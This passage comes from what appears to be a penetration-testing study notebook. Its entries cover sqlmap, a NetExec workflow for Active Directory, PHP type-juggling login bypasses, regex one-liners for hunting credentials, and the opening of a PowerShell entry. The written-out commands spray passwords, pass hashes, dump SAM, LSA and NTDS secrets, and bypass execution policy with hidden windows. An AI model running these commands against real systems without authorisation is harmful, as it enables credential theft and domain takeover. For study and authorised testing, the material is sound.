on some targets). Learn manual SQLi (sqli-logic) as the default; use sqlmap in labs/where allowed.

## Pattern
"Save the request -> sqlmap -r -> dbs -> tables -> dump; raise --level/--risk if stuck." Powerful,
but ration it for OSCP and understand the manual technique it automates. (See: atlas sqlmap,
burp-suite-workflow.)

entries.title: NetExec (nxc) workflow
entries.brief: From a credential to the whole AD, one protocol at a time
entries.body:
## The idea
NetExec (nxc, ex-crackmapexec) sweeps Windows/AD over many protocols with the same syntax:
`nxc PROTOCOL TARGET -u USER -p PASS [options]`. It's your enumerate -> validate -> spray -> dump
Swiss army knife.

## The flow
    # 1) unauth SMB enum:
    nxc smb TARGET -u '' -p '' --shares
    # 2) found a cred? find where it's LOCAL ADMIN across the subnet:
    nxc smb 10.10.20.0/24 -u bob -p 'P@ss'          # 'Pwn3d!' = admin there
    # 3) password policy, then spray:
    nxc smb DC -u users.txt -p 'Season2026!' --pass-pol --continue-on-success
    # 4) LDAP/AD enumeration with the cred:
    nxc ldap DC -u bob -p 'P@ss' --users --groups --kerberoasting --asreproast
    # 5) where admin -> dump secrets:
    nxc smb TARGET -u Administrator -p 'P@ss' --sam --lsa
    nxc smb DC -u da -p 'P@ss' --ntds               # DCSync the domain (needs DA/replication)

## Options & modules
`-H NThash` for pass-the-hash, `-k` for Kerberos, `-x`/`-X` to run cmd/PowerShell, and modules:
    nxc smb TARGET -u .. -p .. -M spooler -M gpp_password -M laps
    nxc -L                                           # list modules

## Pattern
"Same cred, every protocol." Enumerate unauth, validate across hosts (Pwn3d!), check policy then
spray, pull users/roast over LDAP, and dump SAM/LSA/NTDS where you're admin. The backbone of AD
assessment. (See: atlas nxc, smb-enumeration-checklist, active-directory-basics.)

entries.title: PHP type juggling & magic hashes
entries.brief: Why loose comparison (==) breaks authentication logic
entries.body:
## The root cause
PHP's loose comparison `==` converts types before comparing, with surprising results. Code that
compares a secret/hash with `==` (instead of `===`) can be bypassed by feeding a value that
'equals' after juggling.

## The classic cases
- **0e magic hashes**: PHP treats strings like `0e123...` as scientific notation = 0. If two hashes
  both start `0e` followed by only digits, `'0e111' == '0e222'` is **true**. Find an input whose
  md5/sha1 is a 'magic hash' (`0e...`) and it equals any other magic hash.
      md5('240610708') = 0e462097431906509019562988736854   # == any other 0e... hash
- **String vs 0**: in older PHP, `'abc' == 0` was true (string -> 0). `strcmp(array, 'x')` returns
  NULL (==0) -> bypass checks using `strcmp`.
- **JSON/array tricks**: send an array where a string is expected so `==`/`strcmp` misbehaves
  (`password[]=1`).

## Where to use it
Login/token checks: `if ($_POST['mac'] == $computed)` with magic-hash inputs; `strcmp` password
checks with an array; `in_array` loose mode.

## Find it
Test with array params (`param[]=`), `0e`-style values, and leading-zero/numeric strings; watch for
auth passing when it shouldn't. Source review (web-source-review) spots `==`/`strcmp` on secrets.

## Pattern
"Is a secret compared with loose == / strcmp?" Feed a magic hash (0e...), an array, or a numeric
string to make unequal things compare equal. The fix you bypass is strict comparison (===) and
hash_equals().

entries.title: Regex for grep/sed (the parts you actually use)
entries.brief: A compact regex model so your searches and extractions just work
entries.body:
## The building blocks
    .        any char            *   0+ of previous      +   1+ (ERE/-E)
    ^ $      line start/end      ?   0 or 1 (ERE)        {n,m} count (ERE)
    [abc]    a set               [^abc] not in set       [a-z0-9] ranges
    \d \w \s  digit/word/space (PCRE, grep -P)          |   alternation (ERE)
    ( )      group/capture       \1  backreference        \b  word boundary (PCRE)

## BRE vs ERE vs PCRE (which grep)
    grep  'foo.*bar'        # basic regex (BRE): + ? | ( ) need backslashes
    grep -E 'foo(ba|qu)x'   # extended (ERE): + ? | ( ) work bare
    grep -P '(?<=inet\s)\d+(\.\d+){3}'   # Perl (PCRE): lookarounds, \d \w, non-greedy

## Pentest one-liners
    grep -rniE 'password|passwd|secret|api[_-]?key|token' .      # hunt creds (case-insensitive)
    grep -oP '(?<=inet\s)\d+(\.\d+){3}'                       # extract IPv4 (look-behind)
    grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}'       # emails -> usernames
    grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}'                # MAC addresses
    sed -E 's/(user=)[^&]+/\1REDACTED/'                          # capture + replace
Flags: -o (only match), -i (ignore case), -r (recurse), -v (invert), -c (count), -A/-B/-C (context).

## Pattern
"Pick the dialect (-E for +?|(), -P for \d/lookarounds), anchor it, capture what you want with
(), and extract with -o." Regex turns a wall of output into exactly the creds/IPs/emails you need.
(See: atlas grep/sed, creds-hunting.)

entries.title: PowerShell for pentesters
entries.brief: Execution policy, download cradles, AMSI, and the cmdlets you'll live in
entries.body:
## Run what you want
    powershell -ep bypass                     # relax execution policy for THIS session
    powershell -nop -w hidden -c "<cmd>"      # no profile, hidden window, inline command
